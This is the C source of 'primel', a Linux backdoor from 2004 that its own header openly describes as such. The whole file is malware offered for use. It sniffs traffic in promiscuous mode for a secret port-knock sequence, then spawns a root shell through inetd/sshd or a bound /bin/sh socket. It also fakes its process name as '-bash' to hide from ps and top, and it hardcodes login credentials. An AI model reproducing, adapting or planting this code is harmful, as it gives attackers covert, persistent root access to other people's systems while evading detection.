/*
****************************************************************************
* File:        primel.c
* Version:     0.4
* Date:        Sun 06 Jun 2004
* Author:      posidron <posidron@tripbit.org>
*              rushjo <rushjo@tripbit.org>
*
* Description: Primel is a non listening backdoor, that sniffs in promiscuous
*              mode for predefined key ports to open - on success - the
*              remote shell on the target system. The backdoor doesn't
*              support any command line arguments or config files. All
*              configurations will be identified by define directives. If
*              you place the backdoor on a system, you can access the
*              shell with ssh - if the daemon is installed on the remote
*              system - or normal tcp shell. The access to the backdoored
*              system can be protected with DES or with normal plain text
*              verification. Note, if you use DES verification that you
*              link the code with the crypt library, also the glibc-crypt
*              library must be installed on the target system. If you
*              connect to the remote TCP shell over Telnet, note that each
*              command must end with a semicolon.
*
* Environment: - Linux Slackware 9.1; Kernel 2.4.22; GCC 3.2.3
*              - Lunar Linux 1.3.2; Kernel 2.4.26-vanilla; GCC 3.3.3
*
* Compilation: gcc primel.c -o primel -lcrypt -Wall
****************************************************************************
*/


/* Libraries */
#include <crypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/ip.h>
#include <sys/types.h>
#include <linux/tcp.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/inet.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>


/*
***************************************************************************
* Configuration: Change here primel to your needs.
***************************************************************************
*/

//#define AUTH
#define SHELL_SSH
//#define SHELL_TCP
#define BACKLOG   1
#define BIND_PORT 9013
#define START_DIR "/"
#define PROC_NAME "-bash"
#define KEY_PORT_1 8201
#define KEY_PORT_2 6001
#define KEY_PORT_3 7201
#define KEY_PORT_4 9001
#define LOGIN_ATTEMPTS 3
#define PACKET_SIZE 1460
#define STARTUP_CMD "uname --all"

#ifdef AUTH
	//#define AUTH_DES
	#define AUTH_TXT
	#define AUTH_SIZE 256
	#define MSG_AUTH_T "Login success!\n"
	#define MSG_AUTH_F "Login false!\n"

	unsigned int VerifyUserLogin(int);
#endif

#ifdef AUTH_DES
	#define HASH_SIZE 13
	#define AUTH_CUSR "g4pm2DWdZCdLQ"
	#define AUTH_CPWD "s3ieynwYstzyM"

	unsigned int RemoteAuthDES(char *, char *);
#endif

#ifdef AUTH_TXT
	#define AUTH_PUSR "redneck"
	#define AUTH_PPWD "zombie"

	unsigned int RemoteAuthPlain(char *, char *);
#endif

#ifdef SHELL_SSH
	#define PATH_INETD "/usr/sbin/inetd"
	#define PATH_SSHD  "/usr/bin/sshd"
	#define PATH_TMP   "/tmp/.tmp"

	unsigned int OpenRemoteSSH(void);
#endif

#ifdef SHELL_TCP
	#define PATH_SHELL "/bin/sh"

	unsigned int OpenRemoteShell(int);
#endif

/*
***************************************************************************
* End of configuration.
***************************************************************************
*/

struct ethPacket
{
	struct iphdr ip;
	struct tcphdr tcp;
	char buffer[PACKET_SIZE];
};

int SetupLocalServer(void);
unsigned int VerifyKeyPorts(int);
char *ModifyProcessName(char *, char *);


int main(int argc, char **argv)
{
	int lSock, rSock, rSize;
	struct sockaddr_in remote;
	int procId, died, status;


	if(getuid() != 0)
	{
		printf("Runs only under root!\n");
		exit(0);
	}

	ModifyProcessName(argv[0], PROC_NAME);

	procId = fork();

	while(1)
	{
		switch(procId = fork())
		{
			case 0:
			if(VerifyKeyPorts(rSock) != 0)
				continue;

			if((lSock = SetupLocalServer()) < 0)
				exit(1);

			while(1)
			{
				rSize = sizeof(remote);
				if((rSock = accept(lSock, (struct sockaddr*)&remote, &rSize)) == -1)
					continue;

				while(1)
				{
#ifdef AUTH
					if(VerifyUserLogin(rSock) == 1)
						continue;
#endif

#ifdef SHELL_SSH
					OpenRemoteSSH();
#endif
				}
			}
			case -1: exit(1);
			default: died = wait(&status);
		}
	}


	return 0;
}


/*
***************************************************************************
* ModifyProcessName: Shows another process name in a process observing
*                    program like "ps" or "top".
***************************************************************************
*/

char *ModifyProcessName(char *cmdReal, char *cmdFake)
{
	memset((char*)cmdReal, 0x00, strlen(cmdReal) + 1);

	strncpy(cmdReal, cmdFake, strlen(cmdFake) + 1);

	return cmdReal;
}


/*
***************************************************************************
* VerifyUserLogin: If a normal TCP shell is selected, you have the choice
*                  to set DES or normal ASCII password verification.
***************************************************************************
*/

#ifdef AUTH
unsigned int VerifyUserLogin(int rSock)
{
	int recvBytes;
	char authUser[AUTH_SIZE];
	char authPass[AUTH_SIZE];

	send(rSock, "Username: ", strlen("Username: "), 0);
	recvBytes = recv(rSock, (char*)authUser, sizeof(authUser), 0);

	for(; authUser[recvBytes]; recvBytes--)
	{
		if(authUser[recvBytes] == '\n' || authUser[recvBytes] == '\r')
			authUser[recvBytes] = '\0';
	}

	send(rSock, "Password: ", strlen("Password: "), 0);
	recvBytes = recv(rSock, (char*)authPass, sizeof(authPass), 0);

	for(; authPass[recvBytes]; recvBytes--)
	{
		if(authPass[recvBytes] == '\n' || authPass[recvBytes] == '\r')
			authPass[recvBytes] = '\0';
	}

#ifdef AUTH_DES
	if(RemoteAuthDES(authUser, authPass) == 0)
	{
		send(rSock, MSG_AUTH_T, strlen(MSG_AUTH_T), 0);

		OpenRemoteShell(rSock);

		return 0;
	}
	else
	{
		send(rSock, MSG_AUTH_F, strlen(MSG_AUTH_F), 0);

		return 1;
	}
#endif

#ifdef AUTH_TXT
	if(RemoteAuthPlain(authUser, authPass) == 0)
	{
		write(rSock, MSG_AUTH_T, strlen(MSG_AUTH_T));


		OpenRemoteShell(rSock);

		return 0;
	}
	else
	{
		write(rSock, MSG_AUTH_F, strlen(MSG_AUTH_F));

		return 1;
	}
#endif
}
#endif


/*
***************************************************************************
* SetupLocalServer: Sets up an local server, that listen on a specified
*                   port.
***************************************************************************
*/

int SetupLocalServer(void)
{
	int lSock, valOpt = 1;
	struct sockaddr_in local;

	local.sin_family = AF_INET;
	local.sin_port = htons(BIND_PORT);
	local.sin_addr.s_addr = INADDR_ANY;

	if((lSock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		return -1;

	if(setsockopt(lSock, SOL_SOCKET, SO_REUSEADDR, &valOpt, sizeof(valOpt)) == -1)
		return -2;

	if(bind(lSock, (struct sockaddr*)&local, sizeof(local)) == -1)
		return -3;

	if(listen(lSock, BACKLOG) == -1)
		return -4;

	return lSock;
}


/*
***************************************************************************
* OpenRemoteShell: Opens a normal shell on the predefined port. The
*                  location jump to the specified START_DIR.
***************************************************************************
*/

#ifdef SHELL_TCP
unsigned int OpenRemoteShell(int rSock)
{
	dup2(rSock, 0);	dup2(rSock, 1);	dup2(rSock, 2);

#ifdef STARTUP_CMD
	system(STARTUP_CMD);
#endif

	chdir(START_DIR);

	if(execl(PATH_SHELL, PATH_SHELL, NULL) == -1)
		return 1;

	close(rSock);

	return 0;
}
#endif


/*
***************************************************************************
* OpenRemoteSSH: Opens a SSH shell on the predefined port. Note that the
*                ssh daemon must be installed on the remote system.
***************************************************************************
*/

#ifdef SHELL_SSH
unsigned int OpenRemoteSSH(void)
{
	FILE *tmpSSH;
	char *exeArg[] = {PATH_INETD, PATH_SSHD, NULL};

	switch(fork())
	{
		case -1: return 1;
		case 0:
			switch(fork())
			{
				case -1: exit(1);
				case 0: break;
				default: exit(1);
			}
			break;
		default: wait(NULL); return 2;
	}

	if((tmpSSH = fopen(".tmpSSH" , "a+t")) == NULL)
		return 3;

	fprintf(tmpSSH, "5010 stream tcp nowait root "PATH_SSHD" sshd -i -q -D\n");

	fclose(tmpSSH);

	if(execv(PATH_INETD, exeArg) == -1)
		return 4;
}
#endif


/*
***************************************************************************
* RemoteAuthDES: Generates a hash of the sent username and password and
*                comparing it with the predefined hash of username and
*                password.
***************************************************************************
*/

#ifdef AUTH_DES
unsigned int RemoteAuthDES(char *authUser, char *authPass)
{
	static unsigned int NegAttemptsFlag = 0;
	char *tmpUsrHash;
	char *tmpPwdHash;
	char cryptSalt[2];
	char usrHash[HASH_SIZE];
	char pwdHash[HASH_SIZE];

	strncpy(cryptSalt, AUTH_CUSR, sizeof(cryptSalt));
	tmpUsrHash = crypt(authUser, cryptSalt);
	strncpy(usrHash, tmpUsrHash, sizeof(usrHash));

	strncpy(cryptSalt, AUTH_CPWD, sizeof(cryptSalt));
	tmpPwdHash = crypt(authPass, cryptSalt);
	strncpy(pwdHash, tmpPwdHash, sizeof(pwdHash));

	if(strncmp(AUTH_CUSR, usrHash, strlen(AUTH_CUSR)) == 0 &&
	   strncmp(AUTH_CPWD, pwdHash, strlen(AUTH_CPWD)) == 0)
	{
		return 0;
	}
	else
	{
		NegAttemptsFlag++;
		if(NegAttemptsFlag == LOGIN_ATTEMPTS)
		{
			exit(1);
		}
		else
		{
			return 1;
		}
	}
}
#endif



/*
***************************************************************************
* RemoteAuthPlain: Compares the two sent plain text strings with the
*                  predefined strings username and password. If the
*                  negative attempts are higher as the specified value,
*                  than exit.
***************************************************************************
*/

#ifdef AUTH_TXT
unsigned int RemoteAuthPlain(char *authUser, char *authPass)
{
	static unsigned int NegAttemptsFlag = 0;

	if(strncmp(AUTH_PUSR, authUser, strlen(AUTH_PUSR)) == 0 &&
	   strncmp(AUTH_PPWD, authPass, strlen(AUTH_PPWD)) == 0)
	{
		return 0;
	}
	else
	{
		NegAttemptsFlag++;
		if(NegAttemptsFlag == LOGIN_ATTEMPTS)
		{
			exit(1);
		}
		else
		{
			return 1;
		}
	}
}
#endif


/*
***************************************************************************
* VerifyKeyPorts: Sniff for the predefined key ports to open the backdoor.
*                 Only if all four ports are scanned in the correct order,
*                 you can access your remote shell.
***************************************************************************
*/

unsigned int VerifyKeyPorts(int rSock)
{
	int recvBytes;
	unsigned int portTrue = 0;
	struct ethPacket recvPacket;
	struct packet_mreq sockopt;

	sockopt.mr_ifindex = 1;
	sockopt.mr_type = PACKET_MR_PROMISC;
	sockopt.mr_alen = 0;
	sockopt.mr_address[0]='\0';

	if((rSock = socket(PF_PACKET, SOCK_DGRAM, htons(ETH_P_IP))) <= 0)
	{
		return 1;
	}

	if((recvBytes = setsockopt(rSock, SOL_PACKET, PACKET_ADD_MEMBERSHIP,
		(void *)&sockopt, sizeof(sockopt))) < 0)
	{
		return 2;
	}

	for(;;)
	{
		if((recvBytes = recv(rSock, (void *)&recvPacket, PACKET_SIZE, 0)) <= 0)
		{
			return 3;
		}

		if(recvBytes > 20)
		{
			if(recvPacket.ip.protocol == 6)
			{
				if(portTrue == 0 && ntohs(recvPacket.tcp.dest) == KEY_PORT_1)
				{
					portTrue++;
				}
				if(portTrue == 1 && ntohs(recvPacket.tcp.dest) == KEY_PORT_2)
				{
					portTrue++;
				}
				if(portTrue == 2 && ntohs(recvPacket.tcp.dest) == KEY_PORT_3)
				{
					portTrue++;
				}
				if(portTrue == 3 && ntohs(recvPacket.tcp.dest) == KEY_PORT_4)
				{
					return 0;
				}
			}
		}

		if(recvBytes <= 0)
		{
			return 4;
		}
	}
}
